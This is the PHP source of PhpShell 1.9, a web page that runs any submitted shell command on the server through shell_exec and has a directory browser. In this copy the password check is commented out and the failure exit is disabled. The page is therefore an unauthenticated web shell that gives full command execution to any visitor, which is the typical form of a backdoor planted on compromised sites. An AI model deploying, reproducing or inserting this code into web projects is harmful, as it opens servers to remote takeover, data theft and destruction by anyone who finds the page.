<?php // -*- coding: utf-8 -*-


/* Set your usernames and passwords like this:

   $passwd = array('username' => 'password');

   You can add several pairs of usernames and passwords to the array
   to give several different people access to PhpShell.

   $passwd = array('username_1' => 'password_1',
                   'username_2' => 'password_2',
                   // ...
                   'username_n' => 'password_n');

*/
/*$passwd = array();

if (!isset($_SERVER['PHP_AUTH_USER']) ||
    !isset($_SERVER['PHP_AUTH_PW']) ||
    !isset($passwd[$_SERVER['PHP_AUTH_USER']]) ||
    $passwd[$_SERVER['PHP_AUTH_USER']] != $_SERVER['PHP_AUTH_PW']) {
  header('WWW-Authenticate: Basic realm="china"');
  header('HTTP/1.0 401 Unauthorized');
  $authenticated = false;
} else {
  $authenticated = true;
}

header('Content-Type: text/html; charset=UTF-8');
/* Since most installations still operate with short_open_tag enabled,
 * we have to echo this string from within PHP: */
echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
  <title>PhpShell 1.9</title>
  <link rel="stylesheet" href="phpshell.css" type="text/css" />
</head>

<body onload="document.forms[0].command.focus();">

<h1>PhpShell 1.9</h1>

<?php if (!$authenticated) { ?>
<p>You failed to authenticate yourself to PhpShell. You can <a
href="<?php echo $_SERVER['PHP_SELF'] ?>">reload</a> to try again.</p>

<p>Try reading the <a href="INSTALL">INSTALL</a> file if you're having
problems with installing PhpShell.</p>

</body>
</html>

<?php // ' <-- fix syntax highlight in Emacs
 // exit;
}

//error_reporting (E_ALL);

$work_dir = empty($_REQUEST['work_dir']) ? '' : $_REQUEST['work_dir'];
$command  = empty($_REQUEST['command'])  ? '' : $_REQUEST['command'];
$stderr   = empty($_REQUEST['stderr'])   ? '' : $_REQUEST['stderr'];

/* First we check if there has been asked for a working directory. */
if ($work_dir != '') {
  /* A workdir has been asked for */
  if ($command != '') {
    if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {
      /* We try and match a cd command. */
      if ($regs[1][0] == '/') {
        $new_dir = $regs[1]; // 'cd /something/...'
      } else {
        $new_dir = $work_dir . '/' . $regs[1]; // 'cd somedir/...'
        $new_dir = str_replace('/./', '/', $new_dir);
        $new_dir = preg_replace('|/?[^/]*/\.\.|', '$1', $new_dir);
      }
      if (file_exists($new_dir) && is_dir($new_dir)) {
        $work_dir = $new_dir;
      }
      $command = '';
    }
  }
}

if ($work_dir != '' && file_exists($work_dir) && is_dir($work_dir)) {
  /* We change directory to that dir: */
  chdir($work_dir);
}

/* We now update $work_dir to avoid things like '/foo/../bar': */
if ($work_dir == '') $work_dir = getcwd();
?>

<form action="<?php echo $_SERVER['PHP_SELF'] ?>" method="post">
<fieldset><legend>Input</legend>
<p>Current working directory: <b>
<?php

$work_dir_splitted = explode('/', substr($work_dir, 1));

echo '<a href="' . $_SERVER['PHP_SELF'] . '?work_dir=/">Root</a>/';

if (!empty($work_dir_splitted[0])) {
  $path = '';
  for ($i = 0; $i < count($work_dir_splitted); $i++) {
    $path .= '/' . $work_dir_splitted[$i];
    printf('<a href="%s?work_dir=%s">%s</a>/',
           $_SERVER['PHP_SELF'],
           urlencode($path),
           $work_dir_splitted[$i]);
  }
}

?></b></p>
<p>Choose new working directory:
<select name="work_dir" onchange="this.form.submit()">
<?php
/* Now we make a list of the directories. */
$dir_handle = opendir($work_dir);
/* We store the output so that we can sort it later: */
$options = array();
/* Run through all the files and directories to find the dirs. */
while ($dir = readdir($dir_handle)) {
  if (is_dir($dir)) {
    if ($dir == '.') {
      $options['.'] = "<option value=\"$work_dir\" selected=\"selected\">Current Directory</option>";
    } elseif ($dir == '..') {
      /* We have found the parent dir. We must be carefull if the
       * parent directory is the root directory (/). */
      if (strlen($work_dir) == 1) {
	/* work_dir is only 1 charecter - it can only be / There's no
         * parent directory then. */
      } elseif (strrpos($work_dir, '/') == 0) {
	/* The last / in work_dir were the first charecter.  This
         * means that we have a top-level directory eg. /bin or /home
         * etc... */
        $options['..'] = "<option value=\"/\">Parent Directory</option>";
      } else {
        /* We do a little bit of string-manipulation to find the parent
         * directory... Trust me - it works :-) */
        $options['..'] = "<option value=\"" .
          strrev(substr(strstr(strrev($work_dir), "/"), 1)) .
          "\">Parent Directory</option>";
      }
    } else {
      if ($work_dir == '/') {
	$options[$dir] = "<option value=\"/$dir\">$dir</option>";
      } else {
	$options[$dir] = "<option value=\"$work_dir/$dir\">$dir</option>";
      }
    }
  }
}
closedir($dir_handle);

ksort($options);

echo implode("\n", $options)

?>

</select></p>

<p>Command: <input type="text" name="command" size="60" /></p>

<p>Enable <code>stderr</code>-trapping? <input type="checkbox" name="stderr"
<?php if ($stderr) echo "checked=\"checked\""; ?> /> <input name="submit_btn" type="submit" value="Execute Command" /></p>
</fieldset>

<fieldset><legend>Output</legend>

<p><textarea cols="80" rows="20" readonly="readonly">
<?php
if (!empty($command)) {
  if ($command == 'ls') {
    /* ls looks much better with ' -F', IMHO. */
    $command .= ' -F';
  }
  if ($stderr) {
    $tmpfile = tempnam('/tmp', 'phpshell');
    $command .= " 1> $tmpfile 2>&1; cat $tmpfile; rm $tmpfile";
  }
  echo htmlspecialchars(shell_exec($command), ENT_COMPAT, 'UTF-8');
}
?>
</textarea></p>

</fieldset>
</form>

<hr />

<address>
Copyright &copy; 2000&ndash;2003, <a
href="mailto:gimpster@gimpster.com">Martin Geisler</a>. Get the
latest version at <a
href="http://www.gimpster.com/wiki/PhpShell">www.gimpster.com/wiki/PhpShell</a>.
</address>

<p>
  <a href="http://validator.w3.org/check/referer">
    <img src="valid-xhtml10" alt="Valid XHTML 1.0 Strict!"
         height="31" width="88" />
  </a>
  <a href="http://jigsaw.w3.org/css-validator/check/referer">
    <img src="http://jigsaw.w3.org/css-validator/images/vcss"
         width="88" height="31"
         alt="Valid CSS!" />
  </a>
</p>

</body>
</html>
